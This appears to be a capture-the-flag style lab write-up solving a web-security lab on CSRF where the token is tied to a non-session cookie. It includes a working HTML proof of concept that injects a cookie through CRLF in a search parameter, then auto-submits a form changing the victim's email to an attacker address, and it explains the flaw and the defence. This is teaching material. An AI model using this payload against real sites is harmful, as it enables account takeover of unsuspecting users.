# Lab 5: CSRF where token is tied to non-session cookie

**Difficulty:** Practitioner

## Goal

Change the victim's email with a CSRF attack. The `csrf` token is tied to a `csrfKey` cookie, but that cookie is not tied to the session - so injecting a matching key/token pair works.

## Exploit

A two-stage PoC:

1. **Inject the attacker's `csrfKey`** into the victim's browser using the search endpoint, which reflects input into a `Set-Cookie` header. A CRLF (`%0d%0a`) injects a new header.
2. **Submit the change-email form** with the `csrf` token that matches that `csrfKey`.

```html
<img src="https://LAB-ID.web-security-academy.net/?search=x%0d%0aSet-Cookie:%20csrfKey=ATTACKER_CSRF_KEY%3b%20SameSite=None" onerror="submitForm()">

<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="MATCHING_CSRF_TOKEN" />
</form>
<script>function submitForm(){ document.forms[0].submit(); }</script>
```

## Why it works

The token is validated against the `csrfKey` cookie, not the session. Two weaknesses combine:

1. **Cookie injection** - the search endpoint reflects input into `Set-Cookie` without stripping CRLF, letting an attacker set arbitrary cookies in the victim's browser.
2. **Non-session binding** - because `csrfKey` is independent of the session, a key/token pair minted in the attacker's session still validates once that key is planted in the victim's browser.

## Sequencing

The `<img>` loads the cookie-injection URL first; its `onerror` fires only after that request completes, which then submits the form. This guarantees `csrfKey` is set before the form posts.

## Getting a matching pair

Load the change-email page as wiener and read the `csrf` token in the form and the `csrfKey` cookie at that same moment - they are a matched pair. Put the key in the `<img>` URL and the token in the form.

## Takeaway

Tying a CSRF token to a cookie only helps if that cookie is the session cookie and cannot be set by an attacker. A separate, injectable, non-session cookie provides no real protection.
